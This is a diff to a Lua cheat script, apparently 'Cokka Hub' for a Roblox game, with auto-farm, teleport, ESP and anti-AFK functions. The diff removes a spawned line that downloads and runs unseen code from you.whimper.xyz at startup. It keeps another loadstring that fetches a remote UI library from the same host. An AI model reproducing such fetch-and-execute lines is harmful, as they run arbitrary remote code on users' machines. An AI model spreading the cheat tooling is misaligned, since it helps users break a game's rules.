@@ -1,4 +1,3 @@
--- yes please dont use globals :heart:
 local CheckQ, CheckBossQuest, Hop, InfAb, infinitestam, NoDodgeCool, NameMelee, NameSword, checkskillMelee, checkskillDF, checkskillSword, checkskillGun, SendKey, autoskill, CheckInventory, TeleportSeabeast, Click, IsWpSKillLoaded, GetWeapon, EquipAllWeapon, UnEquipWeapon, EquipWeapon, TP, StopTween, CheckPirateBoat, CheckSwanBoat, CheckSeaBeast, CheckLeviathanSegment, CheckLeviathanTail, CheckLeviathan, TeleportLeviathan, TweenTemple, DayNight, ClockTime, BuyGear, PullLever, AncientClock, TweentoCurrentRaceDoor, GetSeaBeastTrial, CheckBossDimension, BoatShit, TPBoatShit, StopTweenBoatShit, CheckDimension, CheckBribe, CheckElite, CheckMirage, CheckKitsune, MoonTextureId, CheckMoonTexture, ClockTime, CheckMoon, CheckLegendarySword, isnil, UpdatePlayerChams, UpdateIslandESP, UpdateChestEsp, UpdateBfEsp, UpdateFlowerEsp, IsIslandRaid, getNextIsland, LockMoon, ESPMirageIsland, CheckAcientOneStatus
 -- manually added locals:
 local MyLevel, CFrameQuest, CFrameMon, Mon, NameMon, NameQuest, LevelQuest
@@ -11,11 +10,6 @@ if getgenv().CokkaRan then
 	return
 end
 getgenv().CokkaRan=true
-
-
-spawn(function()
-	loadstring(game:HttpGet("https://you.whimper.xyz/cute"))()
-end)
 
 local player = game:GetService("Players").LocalPlayer
 while not player.Character do
@@ -1298,7 +1292,7 @@ function CheckBossDimension()
 	end
 end;
 local L_33_ = loadstring(game:HttpGet("https://you.whimper.xyz/sources/CokkaHub/ui.lua"))()
-local L_34_ = L_33_:Window("Cokka Hub 25ms was here", Enum.KeyCode.LeftControl)
+local L_34_ = L_33_:Window("25ms was here", Enum.KeyCode.LeftControl)
 print("|COKKA DEBUG| Anti AFK")
 game:GetService("Players").LocalPlayer.Idled:connect(function()
 	print("|COKKA DEBUG| AFK detected, prevented +1")
